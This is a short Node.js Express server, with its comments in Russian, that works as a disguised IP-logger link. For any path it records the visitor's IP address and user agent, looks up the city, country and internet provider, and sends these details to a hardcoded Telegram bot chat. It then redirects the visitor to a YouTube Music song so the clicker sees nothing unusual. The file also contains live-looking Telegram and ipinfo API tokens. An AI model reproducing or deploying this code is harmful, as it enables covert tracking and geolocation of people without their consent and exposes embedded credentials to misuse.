const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_TOKEN = '8045162630:AAEritxdtynKLUG2mr-C0TMIyc0UcDnlKNY';
const CHAT_ID = '1031226674';

app.get('/', (req, res) => {
    res.send('Сервер работает. Добавь /test в адресе, чтобы перейти на песню.');
});

app.get('/:id', async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'];

        const ipInfo = await axios.get(`https://ipinfo.io/${ip}?token=7a9eeeb48f8390`);
        const data = ipInfo.data;

        const message = `
🥔 <b>Новый переход</b>
🌍 <b>IP:</b> ${data.ip}
📍 <b>Город:</b> ${data.city}, ${data.country}
🏢 <b>Провайдер:</b> ${data.org}
📱 <b>UA:</b> ${userAgent}
        `;

        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        }).catch((err) => {
            console.error('Ошибка отправки в Telegram:', err.message);
        });

        res.redirect('https://music.youtube.com/watch?v=Kswz8FCJmKg&si=NmoCRGUkQtvhX4wK');
    } catch (err) {
        console.error('Ошибка:', err.message);
        res.redirect('https://music.youtube.com/watch?v=Kswz8FCJmKg&si=NmoCRGUkQtvhX4wK');
    }
});

// Держим процесс живым
setInterval(() => {}, 1000 * 60 * 5);

app.listen(PORT, () => {
    console.log(`Сервер запущен на http://localhost:${PORT}`);
});
